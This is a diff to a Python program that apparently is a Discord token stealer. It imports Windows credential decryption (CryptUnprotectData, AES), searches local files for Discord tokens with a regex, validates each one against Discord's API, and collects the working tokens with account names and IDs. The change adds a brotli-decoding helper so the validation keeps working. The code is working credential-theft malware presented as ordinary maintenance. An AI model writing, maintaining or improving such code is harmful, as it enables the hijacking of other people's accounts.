@@ -5,7 +5,7 @@
 # License v3.0. A copy of this license is available at
 # https://www.gnu.org/licenses/agpl-3.0.en.html
 
-import os, re, requests, base64, json
+import os, re, requests, base64, json, brotli
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
@@ -58,6 +58,10 @@ def fetch():
         }
         return headers
     
+    def reqJSON(req) -> dict:
+        try: return req.json()
+        except: return json.loads(brotli.decompress(req.content).decode("utf-8"))
+    
     to_return_tokens = []
     ids = []
 
@@ -106,9 +110,9 @@ def fetch():
                             else:
                                 r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                 if r.status_code == 200:
-                                    tknid = r.json()["id"]
+                                    tknid = reqJSON(r)["id"]
                                     if tknid not in ids:
-                                        to_return_tokens.append([token, f"{r.json()['username']}#{r.json()['discriminator']}", tknid])
+                                        to_return_tokens.append([token, f"{reqJSON(r)['username']}#{reqJSON(r)['discriminator']}", tknid])
                                         ids.append(tknid)
         else:
             for file_name in os.listdir(path):
@@ -119,9 +123,9 @@ def fetch():
                         for token in re.findall(reg, line):
                             r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                             if r.status_code == 200:
-                                tknid = r.json()["id"]
+                                tknid = reqJSON(r)["id"]
                                 if tknid not in ids:
-                                    to_return_tokens.append([token, f"{r.json()['username']}#{r.json()['discriminator']}", tknid])
+                                    to_return_tokens.append([token, f"{reqJSON(r)['username']}#{reqJSON(r)['discriminator']}", tknid])
                                     ids.append(tknid)
                 
     return to_return_tokens
